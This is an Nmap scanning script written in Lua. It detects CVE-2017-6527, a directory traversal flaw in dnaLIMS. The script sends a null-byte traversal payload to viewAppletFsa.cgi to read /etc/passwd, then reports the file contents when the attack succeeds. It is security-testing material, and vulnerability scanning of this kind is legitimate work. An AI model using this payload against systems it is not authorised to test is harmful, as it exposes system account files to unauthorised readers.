local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"

description = [[
dnaLIMS is prone to the Directory Traversal attack.

The viewAppletFsa.cgi seqID parameter is vulnerable to a null terminated directory traversal attack.
This allows an unauthenticated attacker to retrieve files on the operating system accessible by
the permissions of the web server. This page also does not require authentication, allowing
any person on the Internet to exploit this vulnerability.
]]

---
-- @usage
-- nmap --script http-vuln-cve2017-6527 <url>
--
-- @args
-- http-vuln-cve2017-6527.uri
--    Default: '/' (Suggested)
--
-- @output
-- PORT   STATE  SERVICE
-- 80/tcp open   http
-- |  http-vuln-cve2017-6527
-- |    VULNERABLE:
-- |    dnaLIMS is prone to the Directory Traversal attack.
-- |      State: VULNERABLE (Exploitable)
-- |      IDs:
-- |        CVE: CVE-2017-6527
-- |        CWE: 22
-- |          The viewAppletFsa.cgi seqID parameter is vulnerable to a null terminated directory traversal attack.
-- |          This allows an unauthenticated attacker to retrieve files on the operating system accessible by
-- |          the permissions of the web server. This page also does not require authentication, allowing
-- |          any person on the Internet to exploit this vulnerability.
-- |
-- |    References:
-- |      https://www.cvedetails.com/cve/CVE-2017-6527
-- |      https://www.cvedetails.com/cwe-details/22/cwe.html
---

author = "Rewanth Cool"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
  local vulnPath = "cgi-bin/dna/viewAppletFsa.cgi?seqId=../../../../../../etc/passwd%00&Action=blast&hidenav=1"

  -- Exploiting the vulnerability
  local response = http.get( host, port, uri..vulnPath )

  stdnse.debug1(string.format("GET request being processed with payload on %s", host..uri..vulnPath))

  if( response.status == 200 ) then
    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln = {
      title = "dnaLIMS is prone to the Directory Traversal attack.",
      state = vulns.STATE.NOT_VULN,
      description = [[
        The viewAppletFsa.cgi seqID parameter is vulnerable to a null terminated directory traversal attack.
        This allows an unauthenticated attacker to retrieve files on the operating system accessible by
        the permissions of the web server. This page also does not require authentication, allowing
        any person on the Internet to exploit this vulnerability.
      ]],
      IDS = {
        CVE = "CVE-2017-6527",
        CWE = "22",
        references = {
          "https://www.cvedetails.com/cve/CVE-2017-6527",
          "https://www.cvedetails.com/cwe-details/22/cwe.html"
        },
        dates = {
          disclosure = {
            year = "2017",
            month = "03",
            day = "09"
          },
        }
      }
    }

    -- Matching the /etc/passwd pattern
    if string.match( response.body, "([^:]+):([^:]+):([^:]+):([^:]+)::?([^:]+):([^:]+):([^:]+)" ) then
      vuln.state = vulns.STATE.EXPLOIT
      vuln.exploit_results = response.body
      return vulnReport:make_output(vuln)
    end
  end
end
